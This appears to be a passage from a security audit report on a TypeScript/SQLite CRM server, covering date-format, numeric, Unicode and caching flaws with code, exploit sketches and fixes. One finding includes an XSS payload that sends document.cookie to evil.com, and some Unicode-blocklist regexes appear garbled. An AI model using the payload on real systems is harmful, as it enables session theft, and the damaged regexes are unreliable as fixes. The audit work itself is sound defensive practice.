### [MEDIUM] Session `expires_at` stored as ISO 8601 — format mismatch in auth middleware and cleanup

**Where:** `packages/server/src/routes/auth.routes.ts:379`, `packages/server/src/middleware/auth.ts` (session SELECT), `packages/server/src/index.ts:2468` (cleanup DELETE)

**What:**
`sessions.expires_at` is set via `new Date(Date.now() + refreshDays * 24 * 60 * 60 * 1000).toISOString()` (line 379), producing the same 'T'-separated ISO format. The session validity check in `auth.ts` and the nightly cleanup `DELETE FROM sessions WHERE expires_at < datetime('now')` in `index.ts:2468` both use `datetime('now')` (space-separated). Because 'T' > ' ' lexicographically, a session that expired at any point during the current calendar day will still be accepted until UTC midnight, and the cleanup DELETE will not remove it until the day rolls over. For 30/90-day refresh sessions the window is narrow (at most 24 hours of over-life on the expiry calendar day), but it represents stale-session reuse after intentional logout or forced expiry.

**Code:**
```typescript
// auth.routes.ts:379 — stored ISO
const expiresAt = new Date(Date.now() + refreshDays * 24 * 60 * 60 * 1000).toISOString();

// middleware/auth.ts (inferred from index.ts:2468 pattern)
// SELECT ... FROM sessions WHERE id = ? AND expires_at > datetime('now')

// index.ts:2468 — cleanup misses same-day expired rows
db.prepare("DELETE FROM sessions WHERE expires_at < datetime('now')").run();
```

**Exploit:**
After a user's session is force-expired (admin revoke, password change, suspicious activity), the session token remains valid until UTC midnight of the expiry day. An attacker with a stolen session token gets up to 24 extra hours of access. Impact is limited to the expiry calendar day only.

**Fix:**
Same remedy as the reset-token finding: store `expires_at` as `.toISOString().replace('T', ' ').slice(0, 19)`. Update both `auth.routes.ts:379` and any other `issueTokens`/`refreshSession` call that writes `expires_at`. No schema change needed — column is TEXT.

---

### [MEDIUM] Membership billing period advanced with local-timezone `setMonth()` — DST and month-end drift

**Where:** `packages/server/src/routes/membership.routes.ts:178`, `:376`, `:513–514`

**What:**
Three places compute the next billing period end by calling `endDate.setMonth(endDate.getMonth() + 1)`. These methods operate in the **server's local timezone**, not UTC. On servers configured to a DST-observing timezone (e.g., America/New_York), advancing a March 31 period end produces April 30 (correct), but advancing a November 1 period end in the fall-back window can produce unexpected results depending on the host. More critically, `setMonth(+1)` on a 31-day month (Jan 31 → February, Oct 31 → November) silently overflows to the next month (Mar 3, Dec 1), meaning the billing date drifts permanently forward. The same bug was already identified and fixed in `recurringInvoicesCron.ts` using `setUTCMonth()` plus an originalDay clamp, but `membership.routes.ts` was not updated.

**Code:**
```typescript
// membership.routes.ts:178 — local TZ, no leap/31-day clamp
const endDate = new Date(currentPeriodEnd);
endDate.setMonth(endDate.getMonth() + 1);

// membership.routes.ts:513–514 — one-liner with same bug
const newPeriodEnd = new Date(
  new Date(sub.current_period_end).setMonth(new Date(sub.current_period_end).getMonth() + 1)
).toISOString();
```

**Exploit:**
A member on a monthly plan with a period end on the 31st (e.g., January 31) gets charged March 3 instead of February 28/29, then April 3, May 3 — permanently shifted forward. On a DST boundary, billing can shift by ±1 hour, causing end-of-day comparisons to misfire. Billing errors are a direct financial/contractual impact.

**Fix:**
Mirror the fix already present in `recurringInvoicesCron.ts:advanceNextRunAt()`:
```typescript
const d = new Date(currentPeriodEnd);
const originalDay = d.getUTCDate();
d.setUTCMonth(d.getUTCMonth() + 1);
// Clamp overflow (e.g. Jan 31 → Mar 3 becomes Feb 28)
if (d.getUTCDate() !== originalDay) d.setUTCDate(0);
```
Apply to all three sites in `membership.routes.ts`.

---

### [LOW] `dataExportSchedules.routes.ts` `advanceScheduleNextRun` missing leap-day clamp for monthly intervals

**Where:** `packages/server/src/routes/dataExportSchedules.routes.ts:63–71`

**What:**
`advanceScheduleNextRun()` correctly uses `setUTCMonth()` for UTC-safety, but omits the originalDay clamp that `recurringInvoicesCron.ts` applies. On a monthly export schedule anchored to the 31st (or a February 29th anchor), `setUTCMonth(+1)` silently overflows: e.g., March 31 → May 1 when adding a 1-month interval. The next run date permanently shifts, causing the scheduled export to run on the wrong day.

**Code:**
```typescript
// dataExportSchedules.routes.ts:63–71
function advanceScheduleNextRun(nextRunAt: string, frequency: string, interval: number): string {
  const d = new Date(nextRunAt);
  switch (frequency) {
    case 'daily':   d.setUTCDate(d.getUTCDate() + interval); break;
    case 'weekly':  d.setUTCDate(d.getUTCDate() + interval * 7); break;
    case 'monthly': d.setUTCMonth(d.getUTCMonth() + interval); break;  // ← no clamp
    // ...
  }
  return d.toISOString();
}
```

**Exploit:**
A data-export schedule set to run on the 31st monthly drifts to the 1st of the following month after any 31-day month, then continues drifting. Not a security issue per se, but can cause compliance export windows to be silently skipped or mis-aligned, which may violate data-retention SLAs.

**Fix:**
```typescript
case 'monthly': {
  const originalDay = d.getUTCDate();
  d.setUTCMonth(d.getUTCMonth() + interval);
  if (d.getUTCDate() !== originalDay) d.setUTCDate(0);
  break;
}
```

---

### [LOW] `dunning.routes.ts` `days_offset` accepts non-finite and unbounded values

**Where:** `packages/server/src/routes/dunning.routes.ts:74`

**What:**
The dunning step validator checks `if (typeof s.days_offset !== 'number') throw new AppError(...)` but does not check `Number.isFinite()` or apply any upper bound. A `days_offset` of `Infinity`, `NaN` (which passes `typeof x === 'number'`), or an absurdly large integer (e.g., 99999) is accepted and stored. `dunningScheduler.ts` uses this value directly: `cutoffDateIso(db, step.days_offset)` computes `Date.now() - days_offset * 86400000`. With `NaN`, `cutoffDate` becomes `NaN`, and the SQL `invoice_date <= ?` comparison against NaN will match 0 rows (safe but silent failure). With 99999 days (~274 years), the cutoff reaches epoch-0 territory, potentially enqueuing every invoice ever created in a single dunning run (capped by LIMIT 500 per batch, but the intent is wrong).

**Code:**
```typescript
// dunning.routes.ts:74
if (typeof s.days_offset !== 'number') throw new AppError('days_offset must be a number', 400);
// Missing: Number.isFinite() check and max cap
```

**Exploit:**
A tenant admin sets a dunning step with `days_offset: 99999`. The next dunning run targets all invoices from the past 274 years instead of, e.g., 30 days overdue. With LIMIT 500, this sends dunning emails to 500 of the tenant's oldest customers, causing operational and reputational harm. With `Infinity`, the cron silently processes nothing (NaN date), masking the misconfiguration.

**Fix:**
```typescript
if (typeof s.days_offset !== 'number' || !Number.isFinite(s.days_offset) ||
    s.days_offset < 0 || s.days_offset > 365) {
  throw new AppError('days_offset must be a finite integer between 0 and 365', 400);
}
```

---

### [INFO] `validateIsoDate()` has no upper-bound cap — far-future dates accepted

**Where:** `packages/server/src/utils/validate.ts` (`validateIsoDate` function)

**What:**
`validateIsoDate()` validates ISO 8601 format and UTC round-trip correctness but imposes no upper date cap. Dates like `'9999-12-31'` pass validation and are accepted as invoice `due_date`, ticket `due_date`, SLA deadlines, etc. These are stored in the DB and propagate into report queries. While not directly exploitable for privilege escalation, far-future dates can cause silent report exclusions (date-range filters miss them), sorting anomalies, and confusion in overdue/SLA-breach calculations.

**Code:**
```typescript
// validate.ts — validateIsoDate (approx)
export function validateIsoDate(value: unknown): string {
  if (typeof value !== 'string') throw ...;
  if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) throw ...;
  const d = new Date(value + 'T00:00:00Z');
  if (isNaN(d.getTime())) throw ...;
  if (d.toISOString().slice(0, 10) !== value) throw ...;
  return value;  // no upper bound check
}
```

**Exploit:**
A user submits an invoice with `due_date: '9999-12-31'`. The invoice passes validation, is stored, and never appears in any "overdue" report (date-range filter `due_date <= ?` with reasonable TO date). The invoice is effectively invisible in reporting, which could be used to intentionally hide a liability in the system.

**Fix:**
Add a max-year guard: `if (new Date(value).getUTCFullYear() > new Date().getUTCFullYear() + 10) throw new AppError('due_date too far in future', 400);`. Adjust the cap (10 years) to match business requirements.

---

### [INFO] `sessions` cleanup `DELETE` affected by same ISO/SQLite format mismatch — stale sessions persist until midnight

**Where:** `packages/server/src/index.ts:2468`

**What:**
The nightly session-cleanup job runs `DELETE FROM sessions WHERE expires_at < datetime('now')`. Because `expires_at` is stored as ISO 8601 with 'T' separator (see MEDIUM finding above), the comparison `'2026-05-06T10:00:00.000Z' < '2026-05-06 22:00:00'` evaluates FALSE (T=84 > space=32), so any session that expired earlier in the same calendar day is NOT deleted by the cleanup until after UTC midnight when the date prefix advances. This is a defense-in-depth gap: expired sessions accumulate in the DB throughout the day they expire, slightly inflating storage and making the session table a less reliable audit source.

**Code:**
```typescript
// index.ts:2468
db.prepare("DELETE FROM sessions WHERE expires_at < datetime('now')").run();
```

**Exploit:**
No direct security impact beyond the MEDIUM finding above (the auth middleware has the same format mismatch, so expired sessions are not rejected at the gate either). This finding compounds the session-lingering issue.

**Fix:**
Same root fix as the MEDIUM finding: store `expires_at` in SQLite format `'YYYY-MM-DD HH:MM:SS'`. The cleanup DELETE will then correctly remove all same-day-expired sessions on its next run.

---

## Summary

| Severity | Count |
|----------|-------|
| HIGH     | 1     |
| MEDIUM   | 2     |
| LOW      | 2     |
| INFO     | 2     |
| **Total**| **7** |

**Most critical:** `auth.routes.ts:1814,1856` — password-reset token expiry bypass via ISO 8601 `'T'` vs SQLite `datetime('now')` space separator; expired 1-hour tokens valid for rest of UTC calendar day.


---

# T04-numeric

# T04 — Numeric Edge Cases (Currency, Counters, IDs)

Scope: cents arithmetic, float drift, integer overflow, counter allocation, pagination coercions, token entropy, commission/loyalty math.

---

### MEDIUM `roundCurrency()` passes NaN/Infinity to SQLite on corrupted tax rate

**Where:** `packages/server/src/utils/currency.ts:2`
Also: `packages/server/src/routes/tickets.routes.ts:183–186,449,453`

**What:**
`roundCurrency(value)` is implemented as `Math.round(value * 100) / 100` with no `Number.isFinite` guard. If `value` is `NaN` (e.g. from `null / 100`) or `Infinity`, the function returns `NaN` or `Infinity` unmodified. In `tickets.routes.ts`, the tax rate is fetched from the DB as `tc.rate` and divided by 100 at line 183 without null-checking — a NULL column value (rare but possible via direct DB write or a failed migration) yields `NaN`. The NaN then propagates through all downstream `roundCurrency()` calls into the stored `total`, `subtotal`, and `tax_amount` columns.

**Code:**
```typescript
// utils/currency.ts:2
export function roundCurrency(value: number): number {
  return Math.round(value * 100) / 100;  // no isFinite guard
}

// tickets.routes.ts:183-186
const rate = tc.rate / 100;          // NaN if tc.rate is null
const amount = taxInclusive
  ? roundCurrency(price - price / (1 + rate))  // roundCurrency(NaN) = NaN
  : roundCurrency(price * rate);

// tickets.routes.ts:449,453
const total = roundCurrency(subtotal - discount + totalTax);  // NaN stored
```

**Exploit:**
An operator with DB access (or a bug in a migration) sets `tax_classes.rate = NULL`. Any ticket created with that tax class gets `total = NaN` written to the DB. `better-sqlite3` stores NaN as NULL in a REAL column, so the invoice total becomes NULL — the customer is charged $0 and the line item shows blank. Alternatively, a superadmin API that allows raw config edits could be leveraged if such a path exists.

**Fix:**
Add `if (!Number.isFinite(value)) return 0;` at the top of `roundCurrency()`, mirroring the pattern already used in `roundCents()` in `validate.ts`. Additionally add a `CHECK (rate >= 0 AND rate <= 100)` constraint to `tax_classes.rate` in a migration.

---

### MEDIUM NaN pagination in `invoices.routes.ts` — full table returned when page param is non-numeric

**Where:** `packages/server/src/routes/invoices.routes.ts:237–239`

**What:**
`Math.max(1, parseInt(page))` returns `NaN` — not `1` — when `page` is non-numeric (e.g. `"abc"`) because `NaN` poisons `Math.max` in JavaScript (any comparison with NaN is false). The resulting `p = NaN`, `ps = NaN`, `offset = NaN`. SQLite receives `LIMIT NaN OFFSET NaN`; `better-sqlite3` coerces those to `NULL`, which in SQLite means no LIMIT — returning the entire invoices table in a single response. The same pattern exists on `pagesize` via `Math.max(1, parseInt(pagesize))`.

**Code:**
```typescript
// invoices.routes.ts:237-239
const p  = Math.max(1, parseInt(page));           // NaN if page="abc"
const ps = Math.min(250, Math.max(1, parseInt(pagesize)));  // NaN
const offset = (p - 1) * ps;                      // NaN

// Note: Math.max(1, NaN) === NaN  (not 1)
// SQLite LIMIT NaN → no LIMIT → full table scan
```

**Exploit:**
An authenticated user with `invoices.view` permission sends `GET /invoices?page=abc`. SQLite's LIMIT becomes NULL, returning every invoice row for the tenant in one response — potentially thousands of rows including other customers' billing data if the tenant-filter WHERE clause is the only guard. The response can be hundreds of KB, enabling data harvesting and server-side memory pressure.

**Fix:**
Replace `parseInt(page)` with `Math.max(1, parseInt(page, 10) || 1)` — the `|| 1` fallback converts NaN to 1. Or use a validated helper: `const p = Math.max(1, Number.isInteger(+page) ? +page : 1)`. Apply the same fix to `pagesize`.

---

### MEDIUM NaN pagination in `creditNotes.routes.ts` — full table returned when page param is non-numeric

**Where:** `packages/server/src/routes/creditNotes.routes.ts:73–75`

**What:**
Same `Math.max(1, parseInt(x, 10))` pattern as above — radix 10 is provided, but `parseInt("abc", 10)` is still `NaN`, and `Math.max(1, NaN)` is still `NaN`. The LIMIT/OFFSET for the credit notes list query become unbounded.

**Code:**
```typescript
// creditNotes.routes.ts:73-75
const p  = Math.max(1, parseInt(page, 10));             // NaN if page non-numeric
const ps = Math.min(100, Math.max(1, parseInt(pagesize, 10)));  // NaN
const offset = (p - 1) * ps;                            // NaN → NULL in SQLite
```

**Exploit:**
Authenticated user with credit note read access sends `GET /credit-notes?page=x`. SQLite LIMIT is NULL; all credit notes for the tenant are returned in one response. Blast radius is lower than invoices (fewer rows) but same class of vulnerability.

**Fix:**
Same fix as `invoices.routes.ts`: `const p = Math.max(1, parseInt(page, 10) || 1)`.

---

### MEDIUM Commission rate has no upper cap — bps overflow allows >100% commission

**Where:** `packages/server/src/utils/commissions.ts:126`
Also: `packages/server/src/db/migrations/017_user_commission_fields.sql` (no CHECK constraint)

**What:**
`computeCommissionCents` converts a percentage rate to basis points via `Math.round(rate * 100)` with no upper bound check. The `commission_rate` column is `REAL NOT NULL DEFAULT 0` with no DB-level `CHECK` constraint. A superadmin or privileged settings API that writes `commission_rate = 105` would produce `rateBps = 10500`, meaning 105% commission. `calcCommissionCents(10500, commissionableCents)` correctly computes `Math.round(commissionableCents * 10500 / 10000)`, paying out more than the ticket total.

**Code:**
```typescript
// utils/commissions.ts:123-127
if (!Number.isFinite(rate) || rate <= 0) return 0;
if (type === 'percent_ticket' || type === 'percent_service') {
  const rateBps = Math.round(rate * 100);  // no max cap; rate=105 → rateBps=10500
  return calcCommissionCents(rateBps, Math.max(0, commissionableCents));
}
```

**Exploit:**
A super-admin sets a staff member's commission rate to 150% (e.g. for testing or via a bulk-import CSV). Every ticket that user processes generates a commission payout of 150% of the ticket value. Over a payroll period, this inflates payroll by arbitrary multiples of revenue — no alert is triggered because the system treats it as a valid commission row.

**Fix:**
Add `if (rate > 100) throw new Error('commission_rate cannot exceed 100%');` (or cap at 100) in `computeCommissionCents`. Also add `CHECK (commission_rate >= 0 AND commission_rate <= 100)` to the `users` table migration.

---

### LOW 24-bit referral code — online enumeration feasible

**Where:** `packages/server/src/routes/portal-enrich.routes.ts:211–212`

**What:**
`generateReferralCode()` returns `crypto.randomBytes(3).toString('hex').toUpperCase()` — 3 bytes = 24 bits = 16,777,216 possible codes. With no rate limit on the referral redemption endpoint, an attacker can enumerate valid codes at network speed. Finding a valid code allows claiming referral rewards (loyalty points, discount credits) without a genuine referral relationship.

**Code:**
```typescript
// portal-enrich.routes.ts:211-212
function generateReferralCode(): string {
  return crypto.randomBytes(3).toString('hex').toUpperCase();  // 24-bit = ~16.7M
}
```

**Exploit:**
Attacker registers a portal account, then scripts `POST /portal/referral/redeem` with sequential or random 6-hex-char codes. At 10 req/s (below most rate limits), the full space is exhausted in ~19 days. More realistically, with birthday-paradox probability, ~4,100 guesses yield a 50% chance of a collision in a tenant with ~500 active customers.

**Fix:**
Increase to `crypto.randomBytes(16)` (128 bits) and store as a base64url or hex string. Also add rate-limiting (e.g. 5 attempts per IP per hour) on the redemption endpoint.

---

### LOW Ticket tracking token truncated to 32 bits — predictable session token

**Where:** `packages/server/src/routes/pos.routes.ts:1596`

**What:**
`newTicketTrackingToken = crypto.randomUUID().split('-')[0]` discards 96 of the 128 bits of UUID randomness, retaining only the first 8 hex characters (32 bits = ~4.3 billion states). This token is used for customer-facing ticket tracking links. An attacker with a valid tenant URL can enumerate tokens.

**Code:**
```typescript
// pos.routes.ts:1596
newTicketTrackingToken = crypto.randomUUID().split('-')[0];
// crypto.randomUUID() → "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx"
// .split('-')[0] → "xxxxxxxx"  (32 bits only)
```

**Exploit:**
Attacker queries `GET /portal/ticket-status/:token` in a loop with random 8-hex-char strings. At 32 bits and no rate limit, they hit valid tickets with measurable probability given ticket volume. A matched token leaks ticket status, customer name, device description, and appointment time.

**Fix:**
Use the full UUID without truncating: `newTicketTrackingToken = crypto.randomUUID()` (128-bit, 122 bits of randomness). Or use `crypto.randomBytes(16).toString('hex')` for a 128-bit hex token.

---

### LOW Float drift in `computeEarnedPoints` — loyalty points off-by-one at sub-cent boundaries

**Where:** `packages/server/src/utils/loyalty.ts:189`

**What:**
`computeEarnedPoints` returns `Math.floor(amountPaid * pointsPerDollar)`. Both `amountPaid` (a currency float, e.g. `109.99`) and `pointsPerDollar` (e.g. `1.1`) are IEEE 754 doubles. Their product can land just below an integer due to float representation error — e.g. `109.99 * 1.1 = 120.989` in exact math but `120.98900000000001` in float. `Math.floor` on the exact result would be 120, same as the drifted result. However near-integer cases like `100.0 * 1.1 = 110.00000000000001` floor to 110 — consistent — but `99.9 * 1.1 = 109.89000000000001` vs a hypothetical rate like `1.0/3` can yield -1 point relative to the "fair" calculation. The impact is one point per invoice — minor but systematic for fractional rates.

**Code:**
```typescript
// loyalty.ts:189
return Math.floor(amountPaid * pointsPerDollar);
// Example: Math.floor(9.99 * 10) = Math.floor(99.9) = 99  (not 100)
// due to: 9.99 * 10 in IEEE 754 = 99.89999999999999
```

**Exploit:**
No direct exploit; this is a fairness/correctness issue. Customers earn fewer points than the stated rate for some invoice amounts. At scale (thousands of invoices), customers may notice the discrepancy compared to the advertised earn rate.

**Fix:**
Round `amountPaid` to the nearest cent before multiplying: `return Math.floor(Math.round(amountPaid * 100) / 100 * pointsPerDollar)`. Or express `pointsPerDollar` as an integer "points per 100 cents" and use integer arithmetic throughout.

---

### LOW Installment schedule sum comparison uses float equality on accumulated integers

**Where:** `packages/server/src/routes/installments.routes.ts:83–86`

**What:**
`const scheduleSum = schedule.reduce((acc, row) => acc + (Number(row.amount_cents) || 0), 0)` sums integer-valued cents using JavaScript's float accumulator. For schedules with ≤53 items where each `amount_cents` fits in 32 bits, the sum is exact. However if the schedule has many items (the code allows up to 120 rows per `PRAGMA` limits) and individual amounts are large (e.g. $999,999.99 = 99,999,999 cents each), the accumulator can exceed `Number.MAX_SAFE_INTEGER` (2^53 − 1 ≈ 9 × 10^15), losing precision and causing the `scheduleSum !== total_cents` check to pass a mismatched schedule.

**Code:**
```typescript
// installments.routes.ts:83-86
const scheduleSum = schedule.reduce(
  (acc: number, row: any) => acc + (Number(row.amount_cents) || 0), 0
);
if (scheduleSum !== total_cents) {
  return res.status(400).json({ error: `schedule amounts sum to ${scheduleSum}...` });
}
```

**Exploit:**
Unlikely in practice for typical SaaS invoice amounts. However if the system is used for large B2B invoices (e.g. $100,000 each, 120 installments = $12,000,000 = 1,200,000,000 cents), the sum is 1.2 × 10^9 — well within safe integer range. The theoretical overflow threshold would require ~9 × 10^6 per item × 120 items, which is far beyond realistic use. Mark as low-severity but track for completeness.

**Fix:**
Use `BigInt` for the accumulation: `const scheduleSum = schedule.reduce((acc, row) => acc + BigInt(Number(row.amount_cents) || 0), 0n)` and compare as `BigInt(total_cents)`. Alternatively, cap at a reasonable per-installment max in validation.

---


---

# T05-unicode

# T05 — Unicode / Homoglyph / Zero-Width / RTL Override Findings

Auditor slot: T05  
Scope: Unicode normalization, homoglyph, zero-width, RTL override attacks  
Files audited: `utils/validate.ts`, `utils/phone.ts`, `utils/escape.ts`, `utils/fileValidation.ts`, `routes/signup.routes.ts`, `routes/auth.routes.ts`, `routes/customers.routes.ts`, `routes/locations.routes.ts`, `routes/ticketLabels.routes.ts`, `routes/settings.routes.ts`, `routes/teamChat.routes.ts`, `routes/portal.routes.ts`, `services/tenant-provisioning.ts`, `db/migrations/001_initial.sql`

---

### [MEDIUM] Local `validateRequiredString` shadows in locations + ticketLabels skip RTL/control filter

**Where:** `packages/server/src/routes/locations.routes.ts:84` and `packages/server/src/routes/ticketLabels.routes.ts:41`

**What:**
Both route files define a local function also named `validateRequiredString` that shadows the shared import from `utils/validate.ts`. The local copies only check type, emptiness, and length — they never call `rejectControlAndRTL`. This allows zero-width characters (U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM), soft hyphen (U+00AD), and word-joiner (U+2060) to pass through unchecked into location names and ticket label names stored in the database.

**Code:**
```typescript
// locations.routes.ts:84 (and nearly identical in ticketLabels.routes.ts:41)
function validateRequiredString(value: unknown, field: string, maxLen: number): string {
  if (typeof value !== 'string' || value.trim().length === 0) {
    throw new AppError(`${field} is required`, 400);
  }
  const trimmed = value.trim();
  if (trimmed.length > maxLen) {
    throw new AppError(`${field} must be ${maxLen} characters or fewer`, 400);
  }
  return trimmed;
  // *** rejectControlAndRTL is NEVER called ***
}
```

**Exploit:**
An attacker (or malicious employee) creates a location named `Main​Store` (visually "MainStore"). A lookup or display filter for `MainStore` misses it; duplicate-name enforcement passes because the UNIQUE constraint does a binary compare. Over time, the database accumulates phantom duplicates that the UI cannot distinguish.

**Fix:**
Delete the local shadow functions and import `validateRequiredString` from `../../utils/validate`. Alternatively, call `rejectControlAndRTL(trimmed)` inside each local copy before returning.

---

### [MEDIUM] `validateEmail` applies ASCII-only lowercasing — IDN homoglyph emails treated as distinct

**Where:** `packages/server/src/utils/validate.ts:84–111` (`validateEmail`)

**What:**
`validateEmail` normalizes the email with `.trim().toLowerCase()` before the RFC-5322 regex check. `.toLowerCase()` only folds ASCII letters; it does not apply Unicode NFKC/NFKD normalization and does not resolve IDN/Punycode. A Cyrillic `ɡ` (U+0261) looks identical to Latin `g` but is a different codepoint. An attacker can register `victim@ɡmail.com` (Cyrillic ɡ) as a brand-new account; the database UNIQUE constraint treats it as distinct from `victim@gmail.com`.

**Code:**
```typescript
// validate.ts ~line 90
export function validateEmail(value: unknown, field = 'Email'): string {
  if (typeof value !== 'string') throw new AppError(`${field} is required`, 400);
  const email = value.trim().toLowerCase();   // ASCII fold only
  if (!EMAIL_REGEX.test(email)) throw new AppError(`Invalid ${field}`, 400);
  // No IDNA / Punycode normalization, no Unicode NFKC on domain part
  return email;
}
```

**Exploit:**
Attacker registers `support@ɡmail.com` (Cyrillic ɡ) — a domain the shop owner later allowlists. Emails from that "support" account appear legitimate in the CRM. Alternatively, attacker registers a customer account with a homoglyph of an existing customer's email address, evading duplicate-customer detection and receiving that customer's invoices/communications if staff types the wrong variant.

**Fix:**
After the trim/toLowerCase, split on `@`, apply `punycode.toASCII()` (Node `'punycode'` built-in or the `punycode` npm package, per IDNA 2008) to the domain part, and reassemble: `local + '@' + punycode.toASCII(domain)`. Additionally apply `value.normalize('NFKC')` to the full email before comparison to collapse compatibility equivalents.

---

### [MEDIUM] `rejectControlAndRTL` blocklist omits zero-width and invisible Unicode characters

**Where:** `packages/server/src/utils/validate.ts:142–150` (`rejectControlAndRTL` / `DISALLOWED_TEXT_CODEPOINTS`)

**What:**
The regex blocks C0/C1 control characters and Unicode bidi override/isolate codepoints (U+202A–U+202E, U+2066–U+2069), but does NOT block zero-width characters: U+200B (ZWSP), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM/ZWNBSP), U+00AD (Soft Hyphen), U+2060 (Word Joiner), U+202F (Narrow No-Break Space). All of these pass through `validateRequiredString` (the shared one) and are stored in names, titles, and notes throughout the CRM. This affects customer names, ticket titles, invoice line-item descriptions, and any other field validated via the shared `validateRequiredString`.

**Code:**
```typescript
// validate.ts ~line 142
const DISALLOWED_TEXT_CODEPOINTS =
  /[ --‪-‮⁦-⁩]/;
//  ^^^^ C0 controls                  ^^^^ bidi overrides + isolates
// Missing: ​ ‌ ‍ ﻿ ­ ⁠  
```

**Exploit:**
Staff creates a customer named `John​Smith` (ZWSP between John and Smith). In the UI it renders as "John Smith". A second entry for "John Smith" (no ZWSP) passes the duplicate check and gets created. Reports, merge suggestions, and search all treat them as different entities, polluting the customer database and potentially splitting payment/communication history.

**Fix:**
Extend `DISALLOWED_TEXT_CODEPOINTS` to include invisible and zero-width code points:
```
/[ --­​-‏‪-‮⁠⁦-⁩﻿]/
```
Also consider applying `.normalize('NFC')` (at minimum) to all user-supplied text before storing, so that precomposed and decomposed forms of the same character compare equal.

---

### [LOW] Shop name interpolated raw into HTML email — injection in verification email body

**Where:** `packages/server/src/routes/signup.routes.ts:503`

**What:**
During the setup-wizard verification step, the `shopName` value is interpolated directly into an HTML template string without `escapeHtml()`. The field passes `validateRequiredString` (which blocks bidi/control chars and enforces length), but HTML metacharacters (`<`, `>`, `"`, `&`) are not escaped. An attacker registering a shop with a name containing HTML tags injects arbitrary markup into the verification email sent to the admin.

**Code:**
```typescript
// signup.routes.ts ~line 503
const html = `
  <p>You are creating <strong>${shopName}</strong> (${slug}).</p>
  <p>Click the button below to verify your email address.</p>
`;
// shopName is NOT passed through escapeHtml()
```

**Exploit:**
Attacker registers with `shopName = 'Legit Shop</strong><img src=x onerror="document.location=\'https://evil.com/?\'+document.cookie">'`. The verification email's HTML body now contains injected content. If the recipient's email client renders HTML and executes inline handlers (Outlook Web, some mobile clients), the session/auth cookies of the email-viewing admin could be exfiltrated.

**Fix:**
Import and apply `escapeHtml` from `../../utils/escape` before interpolating any user-supplied value into an HTML string: `escapeHtml(shopName)`. Do the same for any other user-controlled field in email templates.

---

### [LOW] Login endpoint does not normalize identifier before DB lookup

**Where:** `packages/server/src/routes/auth.routes.ts:712–737`

**What:**
The `POST /login` handler reads `username` from `req.body` and passes it raw — no `.trim()`, no `.toLowerCase()`, no Unicode normalization — to a parameterised query with `WHERE (username = ? OR email = ?)`. Emails are stored lowercase at registration (via `validateEmail`), so a user typing their email address in mixed case at login will not match the stored row unless SQLite's LIKE/NOCASE collation applies, which it does not here (plain `=` comparison, TEXT column, no `COLLATE NOCASE`). This is primarily a usability/consistency bug but creates a timing oracle: a trimmed/lowercased lookup fails differently from a non-existent user.

**Code:**
```typescript
// auth.routes.ts ~line 712
const { username, password } = req.body;
// ...
const user = await adb.get<any>(
  'SELECT id, username, email, password_hash, role, ... FROM users ' +
  'WHERE (username = ? OR email = ?) AND is_active = 1',
  username,   // raw — no trim, no toLowerCase, no normalize
  username
);
```

**Exploit:**
A user who registered as `admin@shop.com` cannot log in by typing `Admin@Shop.com`. More importantly, an attacker sending `admin@shop.com​` (with trailing ZWSP) gets a fast "no user found" path while a correct email gets the bcrypt path, creating a microsecond-level timing difference usable for username/email enumeration under a controlled network.

**Fix:**
Apply `value.trim().toLowerCase()` (and ideally full `validateEmail` normalization) to the identifier before the DB query, consistent with how it is stored. For timing safety, always run bcrypt against a dummy hash when no user is found (`await bcrypt.compare(password, DUMMY_HASH)`).

---

### [LOW] User creation (`/api/settings/users`) stores username with no Unicode validation

**Where:** `packages/server/src/routes/settings.routes.ts:943–986`

**What:**
The admin user-creation endpoint reads `username` directly from `req.body` and, after a simple non-empty check, stores it verbatim. `rejectControlAndRTL` is never called, and no character whitelist is applied. Zero-width characters (U+200B, U+200D, etc.) and Unicode homoglyphs can be embedded in the username. The UNIQUE constraint in SQLite uses binary comparison, so `admin` and `admin​` are treated as different users.

**Code:**
```typescript
// settings.routes.ts ~line 943
const { username, email, password, first_name, last_name, role = 'technician', pin } = req.body;
if (!username || !first_name || !last_name)
  throw new AppError('Username, first name and last name required', 400);
// ... no rejectControlAndRTL, no /^[a-zA-Z0-9_-]+$/ whitelist
const existing = await adb.get<any>('SELECT id FROM users WHERE username = ?', username);
if (existing) throw new AppError('Username already taken', 409);
// username inserted raw
```

**Exploit:**
An admin (or compromised admin session) creates a user `admin​` (ZWSP suffix). This user appears as `admin` in every UI list. The real `admin` account still exists; the phantom account may be used for lateral movement or to confuse audit logs.

**Fix:**
Apply `validateRequiredString` from `../../utils/validate` (the shared version, which calls `rejectControlAndRTL`) or enforce a strict username pattern such as `/^[a-zA-Z0-9_\-\.]+$/` with a length cap before the uniqueness check.

---

### [LOW] Team-chat membership ACL splits on `--` after `.toLowerCase()` — ZWSP in channel name bypasses check

**Where:** `packages/server/src/routes/teamChat.routes.ts:58–66`

**What:**
Direct-message channels are named `alice--bob` (two usernames separated by `--`). The `assertChannelAccess` guard splits `ch.name` on `--` and checks whether the caller's `username` is in the resulting array. If a channel was created (or mutated in the DB) with a zero-width character embedded in one of the username tokens (e.g., `alice​--bob`), the split produces `['alice​', 'bob']`. User `alice` (no ZWSP) is not in that list, so the access check incorrectly denies `alice` — or, conversely, an attacker who registers as `alice​` gains access to channels meant for `alice`.

**Code:**
```typescript
// teamChat.routes.ts:58
function assertChannelAccess(ch: ChannelRow, req: any): void {
  if (ch.kind === 'general' || ch.kind === 'ticket') return;
  const callerUsername = String(req?.user?.username ?? '').toLowerCase();
  const participants = ch.name.split('--').map((s) => s.trim().toLowerCase());
  if (!participants.includes(callerUsername)) {
    throw new AppError('Not a member of this channel', 403);
  }
}
```

**Exploit:**
If the channel-creation endpoint does not sanitize the participant usernames used to construct the channel name (or if an attacker with DB write access corrupts a channel name), a ZWSP-injected channel name causes `alice` to be locked out of her own DM while `alice​` (a shadow account) gains read access to the message history.

**Fix:**
Strip all zero-width and invisible codepoints from channel names at creation time and normalize the split tokens: `s.replace(/[­​-‏⁠﻿]/g, '').trim().toLowerCase()`. Also enforce that channel names only contain characters drawn from the username alphabet plus the `--` separator, at creation.

---


---

# T06-cache

# T06 — HTTP Cache / CDN Cache / Browser Cache Poisoning

Auditor: slot T06
Files reviewed: `packages/server/src/index.ts`, `packages/server/src/routes/bookingPublic.routes.ts`,
`packages/server/src/routes/portal.routes.ts`, `packages/server/src/routes/portal-enrich.routes.ts`,
